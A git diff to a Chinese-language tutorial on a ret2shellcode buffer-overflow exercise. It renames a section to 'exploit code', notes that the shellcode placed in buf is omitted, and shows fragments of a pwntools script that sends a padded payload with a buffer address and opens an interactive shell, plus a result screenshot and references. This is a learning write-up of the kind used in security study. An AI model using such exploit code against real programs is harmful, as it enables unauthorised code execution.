@@ -111,11 +111,13 @@ cyclic(120)
 cyclic_find(b'daab') # find 'daab' location
 ```
 
-### Step 6 : 撰寫 shellcode，丟進執行程式裡
+### Step 6 : 撰寫 exploit code
 
-**Shellcode :**
+**Exploit code :**
 
 (檔名: exp-ret2shellcode.py)
+
+exploit code 裡面可以讓準備好要進行攻擊的 shellcode 塞進 buf 執行 (這裡先不放 shellcode)
 
 ```
 from pwn import *
@@ -127,3 +129,12 @@ sh.sendline(payload + p32(buf2_addr))
 sh.interactive()
 ```
 
+執行結果:
+
+![image](https://user-images.githubusercontent.com/22366572/148839040-044519be-7615-467c-9812-31f915de2e8c.png)
+
+
+### 參考資料
+
+1. https://hackmd.io/@JuneWave/Hk8MFqWhE?type=view
+2. https://www.bilibili.com/video/BV1Vg4y1z7oF/
